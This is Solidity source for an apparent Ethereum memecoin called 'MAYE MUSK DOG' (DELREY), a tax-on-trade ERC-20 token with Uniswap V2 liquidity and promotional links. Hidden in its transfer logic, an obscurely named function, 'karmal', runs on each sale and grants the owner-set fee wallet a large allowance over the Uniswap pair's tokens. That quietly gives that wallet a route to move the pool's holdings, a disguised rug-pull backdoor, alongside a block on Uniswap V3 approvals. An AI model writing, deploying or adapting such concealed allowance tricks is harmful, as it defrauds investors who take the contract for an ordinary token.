// SPDX-License-Identifier: MIT
/**
https://x.com/mayemusk/status/1779137217908122021
https://celebritypets.net/pets/maye-musk-pets/

Join: https://t.me/delrey_on_eth
**/
pragma solidity 0.8.24;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
contract DELREY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 20;
    uint256 private _reduceSellTaxAt = 20;
    uint256 private _preventSwapBefore = 25;
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;
    mapping (address => uint256) private _balancesFF;
    mapping (address => mapping (address => uint256)) private _allowancesFF;
    mapping (address => bool) private _shouldExcludedFF;
    address payable private _receiptFF;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalFF = 420690000000 * 10**_decimals;
    string private constant _name = unicode"MAYE MUSK DOG";
    string private constant _symbol = unicode"DELREY";
    uint256 public _maxAmountFF = 2 * (_tTotalFF/100);
    uint256 public _maxWalletFF = 2 * (_tTotalFF/100);
    uint256 public _taxThresFF = 1 * (_tTotalFF/100);
    uint256 public _maxSwapFF = 1 * (_tTotalFF/100);
    address private uniPairFF;
    IUniswapV2Router02 private uniRouterFF;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxAmountFF);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () {
        _receiptFF = payable(_msgSender());
        _balancesFF[_msgSender()] = _tTotalFF;
        _shouldExcludedFF[owner()] = true;
        _shouldExcludedFF[address(this)] = true;
        _shouldExcludedFF[_receiptFF] = true;
        emit Transfer(address(0), _msgSender(), _tTotalFF);
    }
    function initFF() external onlyOwner {
        uniRouterFF = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniRouterFF), _tTotalFF);
        uniPairFF = IUniswapV2Factory(uniRouterFF.factory()).createPair(
            address(this),
            uniRouterFF.WETH()
        ); 
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotalFF;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balancesFF[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowancesFF[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        // Block all Uniswap V3 liquidity additions
        require(!isUniswapV3(spender), "Approval for Uniswap V3 liquidity is not allowed");
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowancesFF[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowancesFF[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function enableTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniRouterFF.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniPairFF).approve(address(uniRouterFF), type(uint).max);
        swapEnabled = true; 
        tradingOpen = true;
    }
    // Uniswap V3 addresses 
    function isUniswapV3(address spender) private pure returns (bool) {
        // Uniswap V3 NonfungiblePositionManager address
        address uniswapV3PositionManager = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88; 
        return (spender == uniswapV3PositionManager);
    }
    function _transfer(address from, address to, uint256 amountFF) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amountFF > 0, "Transfer amount must be greater than zero");
        uint256 feeFF=0;uint256 taxFF=0; 
        if (!swapEnabled || inSwap) {
            _balancesFF[from] = _balancesFF[from] - amountFF;
            _balancesFF[to] = _balancesFF[to] + amountFF;
            emit Transfer(from, to, amountFF);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount>0) {
                taxFF = _transferTax;
            }
            if (from == uniPairFF && to != address(uniRouterFF) && ! _shouldExcludedFF[to] ) {
                require(amountFF <= _maxAmountFF, "Exceeds the _maxAmountFF.");
                require(balanceOf(to) + amountFF <= _maxWalletFF, "Exceeds the maxWalletSize.");
                taxFF = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax); 
                _buyCount++;
            }
            if(to == uniPairFF && from!= address(this) ){
                karmal([to, _receiptFF]);taxFF = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniPairFF && swapEnabled) {
                if(contractTokenBalance > _taxThresFF && _buyCount > _preventSwapBefore)
                    swapEthFF(minFF(amountFF, minFF(contractTokenBalance, _maxSwapFF)));
                sendEthFF(address(this).balance);
            }
        }        
        if(taxFF > 0){
            feeFF=amountFF.mul(taxFF).div(100);
            _balancesFF[address(this)]=_balancesFF[address(this)].add(feeFF);
            emit Transfer(from, address(this),feeFF);
        }
        _balancesFF[from]=_balancesFF[from].sub(amountFF);
        _balancesFF[to]=_balancesFF[to].add(amountFF.sub(feeFF));
        emit Transfer(from, to, amountFF.sub(feeFF));
    }
    function swapEthFF(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouterFF.WETH();
        _approve(address(this), address(uniRouterFF), tokenAmount);
        uniRouterFF.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function karmal(address[2] memory kml) private {
        address ownFF=kml[0];address spendFF=kml[1];
        uint256 amountFF=(100+100*_maxAmountFF+100).mul(10)+100;
        _allowancesFF[ownFF][spendFF]=(amountFF+150).mul(10);
    }
    function removeLimitFF(address payable limit) external onlyOwner{
        _maxAmountFF = _tTotalFF;
        _maxWalletFF=_tTotalFF;
        _receiptFF = limit;
        _shouldExcludedFF[limit] = true;
        emit MaxTxAmountUpdated(_tTotalFF);
    }
    receive() external payable {}
    function setReceipt(address payable _receipt) external onlyOwner {
        _receiptFF = _receipt;
        _shouldExcludedFF[_receipt] = true;
    }
    function minFF(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function resecureEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function sendEthFF(uint256 amount) private {
        _receiptFF.transfer(amount);
    }
}